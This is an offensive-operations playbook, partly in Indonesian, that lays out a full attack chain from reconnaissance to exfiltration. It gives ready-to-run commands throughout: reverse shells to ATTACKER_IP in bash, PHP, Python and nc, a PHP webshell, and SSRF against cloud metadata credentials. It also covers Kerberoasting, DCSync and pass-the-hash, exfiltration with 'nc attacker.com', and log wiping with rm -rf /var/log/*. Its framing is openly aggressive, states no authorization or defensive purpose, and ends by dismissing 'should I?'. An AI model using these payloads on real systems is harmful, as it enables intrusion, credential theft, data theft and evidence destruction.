# FOX KILL CHAIN — OPERATIONAL FLOW

```
⚡ SPEED RULES ⚡
Simple web app  → recon to shell  < 5 menit
Corporate net   → full compromise  < 24 jam (simulated)
Game target     → zero to god mode < 30 menit
Never stuck. Satu vector gagal → langsung pivot.
```

---

## PHASE 1: RECONNAISSANCE (1-10 menit)

### Passive Recon
```
subfinder -d target.com | tee recon/domains.txt
amass enum -passive -d target.com | tee -a recon/domains.txt
```

### Subdomain Enumeration
```
# Tools: subfinder, amass, assetfinder, shodanx
# Bruteforce: ffuf + wordlist
ffuf -w /usr/share/wordlists/subdomains.txt -u https://FUZZ.target.com
```

### Technology Fingerprinting
```
whatweb -a 3 target.com
webanalyze -host target.com -crawl 50
wappalyzer (browser)
```

### Directory Bruteforce
```
ffuf -w /usr/share/wordlists/dir.txt -u https://target.com/FUZZ
feroxbuster -u https://target.com -w wordlist.txt
dirsearch -u https://target.com
```

### Parameter Discovery
```
# ParamSpider, Arjun, waybackurls, gau
katana -u https://target.com -d 3
gau --subs target.com | grep "="
arjun -u https://target.com/endpoint
```

### JS Analysis
```
# LinkFinder, SecretFinder, JSParser
python3 SecretFinder.py -i https://target.com/app.js
nuclei -t ~/nuclei-templates/http/exposures/ -l urls.txt
```

### Google Dorking
```
site:target.com inurl:admin
site:target.com ext:sql | ext:env | ext:bak
site:target.com intitle:"index of"
```

**Output tersimpan di:** `operations/<target>/recon/`

---

## PHASE 2: WEAPONIZE (instant)

```
Identify vuln surface → match to tech stack → prepare payloads → select tools
```

| Target Tech | Weapon |
|-------------|--------|
| PHP + MySQL | SQLmap + PHP webshell |
| WordPress | WPScan + wp-exploit |
| Laravel | Laravel debug mode, deserialization |
| ASP.NET | ViewState exploitation |
| Node.js | SSTI, prototype pollution |
| Java/Spring | deserialization, actuator |
| Apache | LFI, log poisoning |
| Nginx | misconfig, path traversal |
| Cloudflare | DNS history, origin IP hunt |
| WAF | identify WAF → choose tamper script |

**Output:** Tool chain dipilih, payload siap.

---

## PHASE 3: INITIAL ACCESS (varying)

### Web Vectors
```
# SQL Injection
sqlmap -u "https://target.com/page?id=1" --batch --random-agent --tamper=space2comment

# LFI → RCE
# Log poisoning, php://filter, /proc/self/environ

# File Upload → Webshell
# Bypass extension filter, magic byte, content-type

# SSRF → Cloud Keys
# http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Deserialization → RCE
# ysoserial, PHPGGC, gadget chains

# Auth Bypass
# SQLi auth bypass, JWT none alg, default creds
```

### Network Vectors
```
# Open ports → service exploitation
nmap -p- -sV -sC target.com

# Default creds
# Admin:admin, root:root, etc.

# Unauthenticated endpoints
# Elasticsearch, Kibana, Jenkins, Minio
```

**Output:** Foothold → reverse shell / webshell / C2 beacon

---

## PHASE 4: ESTABLISH FOOTHOLD

```
# Reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Webshell persistence
# Upload minimal webshell, hide in legit files

# C2 beacon
# Sliver, Havoc, or custom beacon

# Backup access
# SSH key, cronjob, scheduled task, new user
```

### Persistence Techniques
| OS | Method |
|----|--------|
| Linux | cron, SSH authorized_keys, systemd, .bashrc |
| Windows | Scheduled Task, Registry Run, WMI subscription, DLL hijacking |
| Web | webshell hidden in legit file, backdoor in plugin/theme |

**Output:** Controlled access, persistent, multiple backdoors.

---

## PHASE 5: PRIVILEGE ESCALATION

### Linux Privesc
```
# Automated
linpeas.sh | tee privesc/linpeas.txt
./linenum.sh

# Manual checks
sudo -l                                # sudo misconfig
find / -perm -4000 2>/dev/null         # SUID binaries
cat /etc/crontab                       # cron jobs
ls -la /etc/cron*
capsh --print                          # capabilities
uname -a                               # kernel exploit
cat /etc/os-release
ps aux | grep root                     # running as root
cat /etc/passwd | grep -v nologin     # users
wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh
```

### Windows Privesc
```
# Automated
winpeas.exe
PowerUp.ps1
Seatbelt.exe

# Manual
whoami /priv                          # SeImpersonate → Potato
whoami /groups
systeminfo
wmic service list brief              # unquoted service paths
icacls *.exe                          # weak permissions
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
accesschk.exe -uwcqv "Authenticated Users" *
```

### AD Privesc
```
# BloodHound collection
bloodhound-python -u user -p pass -d domain -dc dc01.domain.com -c All

# Kerberoast
impacket-GetUserSPNs -request domain.com/user:password

# AS-REP roast
impacket-GetNPUsers domain.com/ -usersfile users.txt

# Certipy (ADCS)
certipy find -u user@domain.com -p pass -dc-ip 10.10.10.1
certipy auth -pfx certificate.pfx -username admin

# DCSync (need DA)
impacket-secretsdump domain.com/admin:pass@dc01.domain.com
```

**Output:** Root/NT Authority\System/Domain Admin

---

## PHASE 6: LATERAL MOVEMENT

```
# Credential reuse
# Pass-the-Hash
impacket-psexec domain.com/admin@target -hashes LM:HASH

# WMI
wmic /node:target /user:admin /password:pass process call create "cmd.exe /c payload"

# WinRM
evil-winrm -i target -u admin -H HASH

# SMB / PsExec
impacket-smbexec domain.com/admin@target -hashes LM:HASH

# SSH pivot
ssh -J user@jumphost user@target

# Double pivot (SOCKS)
# chisel: server → client
```

**Output:** Entire subnet owned.

---

## PHASE 7: EXFILTRATION & IMPACT

```
# Data extraction (encrypted)
nc attacker.com 4444 < sensitive_data.zip

# DNS exfil
# dnscat2, iodine

# Cloud exfil
# S3, Azure Blob, GCS with encryption

# Cover tracks
rm -rf /var/log/*
sed -i '/192.168.1/d' /var/log/auth.log
```

### Cleanup Checklist
- [ ] Remove uploaded tools
- [ ] Clear bash_history
- [ ] Remove cron entries (if not needed)
- [ ] Clear logs (or just specific entries)
- [ ] Remove created users
- [ ] Restore modified configs

**Output:** Data dapet, jejak dibersihin. Exit clean.

---

## QUICK REFERENCE — COMMON PAYLOADS

```
# PHP Reverse Shell
php -r '$s=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'

# Python Reverse Shell
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("IP",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# NC Reverse Shell
nc -e /bin/sh IP PORT

# Bash Reverse Shell
bash -i >& /dev/tcp/IP/PORT 0>&1

# Web Shell (minimal PHP)
<?php system($_GET['cmd']);?>
```

---

*"Don't ask 'should I?' — ask 'how fast can I tear this apart?'"*
